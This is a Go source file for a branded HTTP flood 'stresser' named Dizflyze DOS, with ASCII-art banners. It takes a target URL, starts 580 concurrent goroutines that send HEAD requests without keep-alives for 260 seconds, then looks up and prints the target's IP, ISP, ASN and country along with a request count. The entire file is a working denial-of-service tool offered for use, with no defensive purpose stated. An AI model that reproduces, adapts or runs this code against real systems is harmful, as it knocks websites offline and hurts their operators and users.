package main

import (
    "bufio"
    "encoding/json"
    "fmt"
    "net"
    "net/http"
    "os"
    "strings"
    "sync"
    "sync/atomic"
    "time"
)

var (
    startTime   = time.Now()
    requests    int64
    concurrency = 580
    duration    = 260 * time.Second
)

const (
    P = "\033[0m"
    R = "\033[31m"
    G = "\033[32m"
    Y = "\033[33m"
    C = "\033[36m"
)

func L() {
    fmt.Println(P + `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⡠
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⠈⠀⠄⠀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠈ [ # ] Dizflyze
⠀⠀⠀⠀⢀⣁⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢋⣭⡍⣿⣿⣿⣿⣿⣿⠐ [ # ] DOS
⠀⢀⣴⣶⣶⣝⢷⡝⢿⣿⣿⣿⠿⠛⠉⠀⠂⣰⣿⣿⢣⣿⣿⣿⣿⣿⣿⡇ [ # ] v1.3.2
⢀⣾⣿⣿⣿⣿⣧⠻⡌⠿⠋⠡⠁⠈⠀⠀⢰⣿⣿⡏⣸⣿⣿⣿⣿⣿⣿⣿ [ # ] 23 JAN
⣼⣿⣿⣿⣿⣿⣿⡇⠁⠀⠀⠐⠀⠀⠀⠀⠈⠻⢿⠇⢻⣿⣿⣿⣿⣿⣿⡟
⠙⢹⣿⣿⣿⠿⠋⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⡿⠟⠁
⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
` + P)
}

func D(ip string) (isp, asn, country string) {
    client := &http.Client{Timeout: 5 * time.Second}
    resp, err := client.Get("http://ip-api.com/json/" + ip)
    if err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    defer resp.Body.Close()

    type ipApiResponse struct {
        Country string `json:"country"`
        Org     string `json:"org"`
        AS      string `json:"as"`
    }

    var data ipApiResponse
    if err := json.NewDecoder(resp.Body).Decode(&data); err != nil {
        return "Unknown", "Unknown", "Unknown"
    }
    return data.Org, data.AS, data.Country
}

func I(host string) string {
    ips, err := net.LookupIP(host)
    if err != nil || len(ips) == 0 {
        return "Unknown"
    }
    return ips[0].String()
}

func HI(url string) string {
    parts := strings.Split(url, "/")
    if len(parts) >= 3 {
        return parts[2]
    }
    return url
}

func fire(url string, wg *sync.WaitGroup, stop <-chan struct{}) {
    defer wg.Done()
    client := &http.Client{
        Timeout: 2 * time.Second,
        Transport: &http.Transport{
            DisableKeepAlives: true,
            MaxIdleConns:      0,
        },
    }
    end := time.Now().Add(duration)
    for {
        select {
        case <-stop:
            return
        default:
            if time.Now().After(end) {
                return
            }
            req, _ := http.NewRequest("HEAD", url, nil)
            req.Header.Set("Accept", "*/*")
            _, err := client.Do(req)
            if err == nil {
                atomic.AddInt64(&requests, 1)
            }
        }
    }
}

func main() {
    L()
    reader := bufio.NewReader(os.Stdin)
    fmt.Print(P + "╔═[ddos]Dizflyze Streser]\n╚═══➤ " + P)
    url, _ := reader.ReadString('\n')
    url = strings.TrimSpace(url)

    var wg sync.WaitGroup
    stop := make(chan struct{})

    for i := 0; i < concurrency; i++ {
        wg.Add(1)
        go fire(url, &wg, stop)
    }

    time.Sleep(duration)
    close(stop)
    wg.Wait()

    elapsed := time.Since(startTime)
    host := HI(url)
    ip := I(host)
    isp, asn, country := D(ip)

    L()
    fmt.Println(R + "╔════════════════════════════════════════════════╗" + P)
    fmt.Printf("%s│%s Link     : %s%s\n", R, P, Y, url)
    fmt.Printf("%s│%s Host     : %s%s\n", R, P, Y, host)
    fmt.Printf("%s│%s IP       : %s%s\n", R, P, Y, ip)
    fmt.Printf("%s│%s ISP      : %s%s\n", R, P, C, isp)
    fmt.Printf("%s│%s ASN      : %s%s\n", R, P, C, asn)
    fmt.Printf("%s│%s Country  : %s%s\n", R, P, C, country)
    fmt.Printf("%s│%s Duration : %s%s\n", R, P, G, elapsed)
    fmt.Printf("%s│%s Requests : %s%d\n", R, P, G, requests)
    fmt.Println(R + "╚════════════════════════════════════════════════╝" + P)
}
